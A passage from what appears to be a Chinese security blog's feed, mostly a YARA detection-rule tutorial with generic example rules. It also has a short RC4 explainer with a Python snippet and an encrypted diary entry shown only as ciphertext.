class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#a in (filesize-500..filesize) == 2</span></span><br><span class="line"><span class="comment">//文件最后500个字节中的“a”字符串数必须正好等于2。</span></span><br></pre></td></tr></table></figure><h3 id="3-3-2-String-offsets-or-virtual-addresses"><a href="#3-3-2-String-offsets-or-virtual-addresses" class="headerlink" title="3.3.2 String offsets or virtual addresses"></a>3.3.2 String offsets or virtual addresses</h3><p>需要知道字符串是否位于文件上的某个特定偏移量或进程地址空间中的某个虚拟地址，使用at。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rule AtExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a at <span class="number">100</span> <span class="keyword">and</span> $b at <span class="number">200</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>at的优先级高于and</p><p>at运算符允许在文件或进程内存空间中的虚拟地址的某个固定偏移量处搜索字符串，而in运算符允许在偏移量或地址范围内搜索字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rule InExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a in (<span class="number">0.</span><span class="number">.100</span>) <span class="keyword">and</span> $b in (<span class="number">100.</span>.filesize)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  可以使用@a[i]获得字符串$a第i次出现的偏移量或虚拟地址。索引是基于1的，因此第一次出现是@a[1]，第二次出现是@a[2]，依此类推。如果提供的索引大于字符串的出现次数，则结果将是一个NaN（不是数字）值。</p></blockquote><h3 id="3-3-3-File-size"><a href="#3-3-3-File-size" class="headerlink" title="3.3.3 File size"></a>3.3.3 File size</h3><p>直接就是<code>filesize</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rule FileSizeExample</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        filesize &gt; <span class="number">200</span>KB</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-4-Executable-entry-point"><a href="#3-3-4-Executable-entry-point" class="headerlink" title="3.3.4 Executable entry point"></a>3.3.4 Executable entry point</h3><p>另个一特殊的变量就是<code>entrypoint</code>，当然，使用这个的前提必须是pe文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rule EntryPointExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = &#123; E8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> &#125;</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a at entrypoint</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rule EntryPointExample2</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = &#123; <span class="number">9</span>C <span class="number">50</span> <span class="number">66</span> A1 ?? ?? ?? <span class="number">00</span> <span class="number">66</span> A9 ?? ?? <span class="number">58</span> <span class="number">0F</span> <span class="number">85</span> &#125;</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a in (entrypoint..entrypoint + <span class="number">10</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-5-给定位置的数据访问"><a href="#3-3-5-给定位置的数据访问" class="headerlink" title="3.3.5 给定位置的数据访问"></a>3.3.5 给定位置的数据访问</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int8(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">int16(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">int32(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line"></span><br><span class="line">uint8(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">uint16(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">uint32(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line"></span><br><span class="line">int8be(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">int16be(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">int32be(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line"></span><br><span class="line">uint8be(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">uint16be(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br><span class="line">uint32be(&lt;offset <span class="keyword">or</span> <span class="keyword">virtual</span> address&gt;)</span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule IsPE</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        <span class="comment">// MZ signature at offset 0 and ...</span></span><br><span class="line">        uint16(<span class="number">0</span>) == <span class="number">0x5A4D</span> <span class="keyword">and</span></span><br><span class="line">        <span class="comment">// ... PE signature at offset stored in MZ header at 0x3C</span></span><br><span class="line">        uint32(uint32(<span class="number">0x3C</span>)) == <span class="number">0x00004550</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-6-字符串集"><a href="#3-3-6-字符串集" class="headerlink" title="3.3.6 字符串集"></a>3.3.6 字符串集</h3><p>使用<code>of</code>，至少存在字符串集中的一部分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rule OfExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line">        $c = <span class="string">&quot;dummy3&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="number">2</span> of ($a,$b,$c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">rule OfExample2</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $foo1 = <span class="string">&quot;foo1&quot;</span></span><br><span class="line">        $foo2 = <span class="string">&quot;foo2&quot;</span></span><br><span class="line">        $foo3 = <span class="string">&quot;foo3&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="number">2</span> of ($foo*)  <span class="comment">// equivalent to 2 of ($foo1,$foo2,$foo3)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rule OfExample3</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $foo1 = <span class="string">&quot;foo1&quot;</span></span><br><span class="line">        $foo2 = <span class="string">&quot;foo2&quot;</span></span><br><span class="line"></span><br><span class="line">        $bar1 = <span class="string">&quot;bar1&quot;</span></span><br><span class="line">        $bar2 = <span class="string">&quot;bar2&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="number">3</span> of ($foo*,$bar1,$bar2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以直接使用<code>($*)</code>引用所有字符串，或者可以使用<code>them</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rule OfExample4</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line">        $c = <span class="string">&quot;dummy3&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="number">1</span> of them <span class="comment">// equivalent to 1 of ($*)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有以下几种：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">all of them       <span class="comment">// all strings in the rule</span></span><br><span class="line">any of them       <span class="comment">// any string in the rule</span></span><br><span class="line"><span class="function">all <span class="title">of</span> <span class="params">($a*)</span>      <span class="comment">// all strings whose identifier starts by $a</span></span></span><br><span class="line"><span class="function">any <span class="title">of</span> <span class="params">($a,$b,$c)</span> <span class="comment">// any of $a, $b or $c</span></span></span><br><span class="line"><span class="function">1 <span class="title">of</span> <span class="params">($*)</span>         <span class="comment">// same that &quot;any of them&quot;</span></span></span><br><span class="line"><span class="function">none <span class="title">of</span> <span class="params">($b*)</span>     <span class="comment">// zero of the set of strings that start with &quot;$b&quot;</span></span></span><br></pre></td></tr></table></figure><h3 id="3-3-7-对多个字符串应用相同的条件"><a href="#3-3-7-对多个字符串应用相同的条件" class="headerlink" title="3.3.7 对多个字符串应用相同的条件"></a>3.3.7 对多个字符串应用相同的条件</h3><p>使用的是<code>for...of</code>操作符：</p><p><code>for expression of string_set : ( boolean_expression )</code></p><blockquote><p>  从string_ set中的这些字符串中，至少它们的expression必须满足boolean_expression</p></blockquote><p>可以使用<code>$</code>来做占位符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">for</span> any <span class="title">of</span> <span class="params">($a,$b,$c)</span> : <span class="params">( $ at pe.entry_point  )</span></span></span><br></pre></td></tr></table></figure><h3 id="3-3-8-使用带of和for-of的匿名字符串"><a href="#3-3-8-使用带of和for-of的匿名字符串" class="headerlink" title="3.3.8 使用带of和for..of的匿名字符串"></a>3.3.8 使用带of和for..of的匿名字符串</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rule AnonymousStrings</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $ = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $ = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="number">1</span> of them</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-9-迭代字符串出现次数"><a href="#3-3-9-迭代字符串出现次数" class="headerlink" title="3.3.9 迭代字符串出现次数"></a>3.3.9 迭代字符串出现次数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rule Occurrences</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="keyword">for</span> all i in (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) : ( @a[i] + <span class="number">10</span> == @b[i] )</span><br><span class="line">    <span class="comment">//也可以这样写</span></span><br><span class="line">    <span class="comment">//for all i in (1..3) : ( @a[i] + 10 == @b[i] )</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>#a表示$a的出现次数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">for</span> all i <span class="title">in</span> <span class="params">(<span class="number">1.</span>.#a)</span> : <span class="params">( @a[i] &lt; <span class="number">100</span> )</span></span></span><br><span class="line"><span class="function"><span class="comment">//每次出现都在前100字节内</span></span></span><br></pre></td></tr></table></figure><h3 id="3-3-10-Iterators"><a href="#3-3-10-Iterators" class="headerlink" title="3.3.10 Iterators"></a>3.3.10 Iterators</h3><p>yara4.0后<code>for...of</code> 得到了改善</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> any section in pe.sections : ( section.name == <span class="string">&quot;.text&quot;</span> )</span><br><span class="line"><span class="comment">//等价</span></span><br><span class="line"><span class="function"><span class="keyword">for</span> any i <span class="title">in</span> <span class="params">(<span class="number">0.</span>.pe.number_of_sections<span class="number">-1</span>)</span> : <span class="params">( pe.sections[i].name == <span class="string">&quot;.text&quot;</span> )</span></span></span><br></pre></td></tr></table></figure><h2 id="3-4-More-rules"><a href="#3-4-More-rules" class="headerlink" title="3.4 More rules"></a>3.4 More rules</h2><h3 id="3-4-1-Global-rules"><a href="#3-4-1-Global-rules" class="headerlink" title="3.4.1 Global rules"></a>3.4.1 Global rules</h3><p>全局规则允许您同时在所有规则中施加限制。全局规则可以有很多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">global rule SizeLimit</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        filesize &lt; <span class="number">2</span>MB</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-2-Rule-tags"><a href="#3-4-2-Rule-tags" class="headerlink" title="3.4.2 Rule tags"></a>3.4.2 Rule tags</h3><p>这些tag稍后可以用于过滤YARA的输出</p><h3 id="3-4-3-Metadata"><a href="#3-4-3-Metadata" class="headerlink" title="3.4.3 Metadata"></a>3.4.3 Metadata</h3><p>没啥说的，上面写了。</p><h1 id="4-Modules"><a href="#4-Modules" class="headerlink" title="4.Modules"></a>4.Modules</h1><h2 id="4-1-PE"><a href="#4-1-PE" class="headerlink" title="4.1 PE"></a>4.1 PE</h2><blockquote><p>  <a href="https://yara.readthedocs.io/en/v4.2.3/modules/pe.html">https://yara.readthedocs.io/en/v4.2.3/modules/pe.html</a></p></blockquote><p>有点多，，没啥写的</p><p>后面那个elf也是</p><h2 id="4-2-Magic"><a href="#4-2-Magic" class="headerlink" title="4.2 Magic"></a>4.2 Magic</h2><p>就是文件的 magic，可以file命令查看</p><p>Magic Module一共两个函数：</p><ul><li><p>type()：returning a string with the type of the file.</p><p><code>magic.type() contains &quot;PDF&quot;</code></p></li><li><p>mime_type()：returning a string with the MIME type of the file.</p><p><code>magic.mime_type() == &quot;application/pdf&quot;</code></p></li></ul><h2 id="4-3-Hash"><a href="#4-3-Hash" class="headerlink" title="4.3 Hash"></a>4.3 Hash</h2><p>不用解释了，，有：MD5，sha1，sha256</p><h2 id="4-4-Math"><a href="#4-4-Math" class="headerlink" title="4.4 Math"></a>4.4 Math</h2><blockquote><p>  允许您从文件的某些部分计算某些值，并基于这些结果创建签名。</p></blockquote><h2 id="4-5-Console-module"><a href="#4-5-Console-module" class="headerlink" title="4.5 Console module"></a>4.5 Console module</h2><ul><li>log(string)：<code>console.log(pe.imphash())</code></li><li>log(message,string)：<code>console.log(&quot;The imphash is: &quot;, pe.imphash())</code></li></ul><p>后面的参数不止可以string，int，float也可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;1-YARA简介&quot;&gt;&lt;a href=&quot;#1-YARA简介&quot; class=&quot;headerlink&quot; title=&quot;1.YARA简介&quot;&gt;&lt;/a&gt;1.YARA简介&lt;/h1&gt;&lt;p&gt;YARA 是一个旨在（但不限于）帮助恶意软件研究人员识别和分类恶意</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="Antivirus" scheme="https://ghostasky.github.io/tags/Antivirus/"/>
    
  </entry>
  
  <entry>
    <title>RC4</title>
    <link href="https://ghostasky.github.io/2022/07/27/RC4/"/>
    <id>https://ghostasky.github.io/2022/07/27/RC4/</id>
    <published>2022-07-26T16:00:00.000Z</published>
    <updated>2022-07-27T15:01:50.124Z</updated>
    
    <content type="html"><![CDATA[<p>hw摸鱼，闲的没啥事干，把RC4的加解密原理写一遍吧，明天干别的东西。（hw期间电脑装了dlp，，就不截图了）</p><p>RC4，对称加密算法，流加密，秘钥长度可变。RC4 算法广泛应用于 SSL&#x2F;TLS 协议和 WEP&#x2F;WPA 协议。</p><p>RC4加解密时依次以字节流的方式加解密明文中的每一个字节。</p><h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><p>RC4中的一些变量：</p><ul><li>密钥流：与明文长度相等，加密生成的密文也是相同的字节</li><li>状态向量S：长度为256，S[0]~S[255]，每个单元一字节，</li><li>临时向量T：长度为256，每个单元为一字节，如果密钥的长度是256字节，就直接把密钥的值赋给T，否则，轮转地将密钥的每个字节赋给T</li><li>密钥K(Key)：长度为1~256字节(<code>keyLen</code>)，密钥的长度与明文长度、密钥流的长度没有必然关系，通常密钥的长度16字节（128比特）。</li></ul><p>RC4算法步骤：</p><ol><li>初始化S和T</li><li>初始排列S（前两部分称为KSA）</li><li>产生密钥流（称为PRGA）</li></ol><h2 id="初始化S和T"><a href="#初始化S和T" class="headerlink" title="初始化S和T"></a>初始化S和T</h2><p><img src="/2022/07/27/RC4/rc4_s_t.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    self.S.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.keyLen):    </span><br><span class="line">    index = random.randint(<span class="number">0</span>, <span class="number">63</span>)</span><br><span class="line">    self.Key.append(self.charTable[index])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    tmp = self.Key[i % self.keyLen]</span><br><span class="line">    self.T.append(tmp)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;hw摸鱼，闲的没啥事干，把RC4的加解密原理写一遍吧，明天干别的东西。（hw期间电脑装了dlp，，就不截图了）&lt;/p&gt;
&lt;p&gt;RC4，对称加密算法，流加密，秘钥长度可变。RC4 算法广泛应用于 SSL&amp;#x2F;TLS 协议和 WEP&amp;#x2F;WPA 协议。&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="Crypto" scheme="https://ghostasky.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>HW日记</title>
    <link href="https://ghostasky.github.io/2022/07/25/2022-hw/"/>
    <id>https://ghostasky.github.io/2022/07/25/2022-hw/</id>
    <published>2022-07-24T16:00:00.000Z</published>
    <updated>2022-08-01T14:02:21.364Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="风中传来苦咸，是悔恨的气味吗?" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="dcda8d34210a2a66b79adc3b4303210bdc72d7c7906d52b857e101959534a48b">f045e053d6254bea7b0b1b710a9b6ff631a1d1b1f06fa641516db0d753f357081ba065ba90fcf1ae5642e257c32e0f50739af394efcf112a36c73d9161a9aee8846c82e50dfa17faed74f6d7ac9820527e7b7af76e2e1c8b722fe2dc31ebaa02710ea957f1ae0896b88d1fcead7981bc3a5ad61cfdb34f6caf010ac76ca2755f3d84d8f384447323dda4dabd71e78d15c93023ee14a0023e00637d64673eb81a194d7793da77db4ddb5162c1e8dc93e7d15cd65b13573ee7693240263b5a9efa77c4374eb2efe4d587098dc6f4ab3b5ecb61d4041c6d431489a89183d390445128bed279762408528bbcdee14fcd70618ac1f72c9a8d1056fb0f183a811653966e3bbca0efbb0e635919a2b256c47927704ad25ebcaf399c218305cb240c9fbedc9c487d671465bca6e67db6b43d30dc9d5fdd55ca9cd9812eee68681254094a5fd1eb19adc051870d4d8337a1a7c1f3b527102f6e2ba11a0f1544f7a331fcf78729447cc50b894b3f3bca5dc00a1b736d9e503edee32102c5d0895a3e8f92d65d2285a372ea9351ebe9e554ee74ccf5d3074330fa1efb1d9d77d686f38bcea0e0e6526233af3839875ac44972400f4343584ff15f32e46f9acec3fa47e6799ba69d6601faea99ff247a08b1074cd7f5b6e8e580019507a24781d60587e3a30bb6a81211c635447f0d401aba1aeb69cf39a081b3d9f2397ac38ecc86f2fc91964e3ec2e2aeb325f16f011065f7b267d849fe85fe199026659afdeceb03bf284c7c5751a85744641adb443c44ea10a6790bce1227645eaa8a568db2d9b0658c757ba65bdb60a46bd7178a79af19386600b0ae969e313ada35b50c6f1d154a42a6eeb006f2b19722d37263029bd32888f73eb8b804bcecf621c9acb3207f658a849676f6fcb20e17f0788de375b267d82eb597e3e0bc83ea9cc5675953b076f94c2b25c850a37dc3ccb18030d2448ecd4ad402a4540a2665f84ad80f7a940379482e3b28ad4cad3c9b846032b8149e13ddc37985c137ab80d823629bb696b54ec731ffe6cb948e29de74fc3abd7f1428f9942e1e7e92c4ee342476fee27443c5a9f3538cda43928cb61aa54cf46811777cbbf7c04b3a1e1f369b8212c2fcd46abb18546c92e1bd1b6e49351f9ed1ac0f7f79a577b460d711d45fdb86f31bd2f38c5a71088fd763ef3b850a08f5f73363c8bddecd59257cc4c4efc19ddc76d89ae45e5f4f59471883e55e385898a456b34d315f0781786dad9da52d328e186a87562c19bf8cdc6e1dce6ccda01cc8ea0ad22cced68dcc4d249114722c819218ab4c74e9404ac6b4423098524de2aaf4c779b19810501769e67a89515acd1815a412094d53d71cc7377cdec16f9352c51d32096125cfb1bc2d635ebf95d2a86f9521480d54ebe2786b3bc9c0da769848d6cd0f06effa8015879fc7fb6804ed30543312897e6af401c79bbc2a210b31d8750e13d7431b59d34dd256f7c54740b0862d43af571b1fd14bf15ce506e90cf184c72e0493eb9212679bb2a5132850ad0601d938f67896bc4eef296b9a817e977bb724876f81f44e60c1e69fcdb8c650ff01040b2354044002825fbc0a19b64e917f5de76ae094dce0d6cf99d711d142426007a6417bffea96e2690c0ae785f2b1fcc9ca44703b5c53cdefda5b8d07e4bd9b81e2e107bd4bcfef54635e058c3465fa98af6e45ab7ac6ab709a62d192c78fbe82360bd29e155a854a0591668787ce2af20035d9cee526257cf1437d17d909db182c4005af3c3bb70d448fa8b7640fe90921507e795dcc783b740d206a976aa823edab493fb6f9517901425602c08ca55c6015830dbfc4a627236189796bbe2da23af2ab2191b26a6cb181c7f08644f34ce87de3ff7c02f5f04cd3ee582280c1bb72faadec9f109cfb9b18276e636ae22273322f8112f13bba978ddbab07f4740f864ab23f199baddf4405b89050818ad9a1b822aa8cb1fa5c2e3b289f66e6cb283216be50eed61dcf76461287c0cda84d88ad319bd975e1608740d9786262f4bca16744742ed9d109d0c815bb19c008db645886d2292077d8a702706b4c1758e7721198e5e0004c3d45ca55d1091481c9c891d0a53582ecaf5392de4be39eb7c25c143a3f5348a40dc9b7218c3ddf0b81c20eaa92579f205d7c7c9494fa4afa516518108b45ab5ac4c6434e3517276e15e5de5c4765f06e4627f857466353467f94c4cb2502aa975919d448402b7d5356156c161cf4f7890360ee0fdc5f2cf50f6cd9d5686fc8dfe698c6a7455eaf0afcd3796d984c1d5cc0bc7626c17039c56416b35339b7c197630bfb253fb010bb66c74b705f5a1449ea5af09161b85e9d4aa8fe05f2865b787bfde84c9f1d99f1e46d513229c49845ec802d0efb74a4c30d2a9341be6034c1555e83fce7fb30b900a531787f6d23a854040ed5fde09264e66802f7eb7527f3d950a5911f5cff3f1a848d65a9f482d0d77ad92170340419fa88d2bd486569e477623ada7667c0c5348def6f1aac43c0a48d8e144610e5246f75f2af819d3676e99e2f7be3b8115292f41d9e8870cd4b0940fdd83182df715b82413486f6932aaa1a808aae1befa6a11157098f75f50f1766090026c8249e90c0b9961e2182efec249ccfd0498b412818952b6b9f958c1b9bdca61186e14781618986c83ced7ec682aee48a46c542a82cbc01ea7174d5799c4d5eb006520734e37007270e437c11fb18a493cdf4a38d3bfb016baef6772f7449e0edbb892cb31a4bbbac52491211766e83ed50126a0194d5c12a07dfa79b9e543e11a9c426a8373bf17ffc10d619b2ff525b1f8f53373358449ff866415f7dc6df5354e8b80e43113e932f9c862bbd2df8536ab56c3eb4df99f58fb65032b9e3fbac9fe4117bade1d9cbb80e0da2d962d1518094e6e5a239682909354245039a598cd5774e55ae4e94b7f04286a527c4c08e9241468f852f2fb51295d2375f86235b8b15eec85d3efe3eeb01a5a3b1e3e13781c53f546030a9d9a13a2483b316046e8c06dc9abbbd242233b98ae81595ad3469ae9ca2a124335b25c00138541fb7408486c2192d9d6680f459ee48e10620b25f60174fcf51ea390983a8ff63e22339e3a1ea6c57429f27f25067af67ee5b3bca6f7a30eb6c7df2588eb0b561bad2d04b3d57289880f083a4a6d921d3eeb882b54eb107d7f8a1d2af17531ff439af2120d80146f8efaaf7753d6a39d49825da0dfc2ed3201cf6d2bd677c3eb37d0f07a6e125706e59205ea73185b70de1a71372ee45ba57c9bb0e62c56be1e2bdf29965cb2d93f80f4ea843253e4cbe6eaf8881a5ea772e3667dbd9d6879e33344649c42cb6610b3310a591b7c8d4167f9eb0f2f4e7973dc51ba810139e2e8b441dbc095d9038c549429e6b6b4bd28460ac31cc609a6b13a75cee14e21424e1e202da1feb3a041caa5e752e506dce48948a7c40aa07dd097e67d604fca665aac5013333bea49d23a8cc19addb5a39f31a60c4138e42863c328827f2ef106f1bd325b793c04a4611e80a74c0104a13b3597492aae1c4def37d44b024558f8a84a8e92926a47c0e004bc239414f201dc13c86625748aba7d03bb275ca2b98489cf1e3f22119cf3840940dd3cddcd5e3e08d4e59d36ccc181bedc81cd32ae85922de588efb8dfa19f0a4e0157d5c5306570742b5f0b768f70b796b64a5eec0fd5ce7c865470ccb49950e48f302d64f3ad54aaadef6b9fca13c9ba54ab9d5d791651562c10aaf0807148b961a73b4ffc6ff20171e8f0bf75ce366b015596f867bb902b285bdc86bca887d81e767e24a9693ab152ad8479409db5d7e0bcad7258e443ed8986f22299a4578b1c081dd956a23393842deab296e54a8484328c86c1a61437fd290b64405227773b6a3d6f4618b1225888e70531450f5d7d3f23d5f26f07faeda438978c2ba9da547ae84a3aa5789b06df7c42b1c048eea2cdc0e4c15cbe8457feac6082cd9d84aec6b65486259be94048a2fb5b6b29840890de3fe75496336594c482bd25cae78476e8870123165182f55e33ff1d31821fb1947ba4477513d3cdd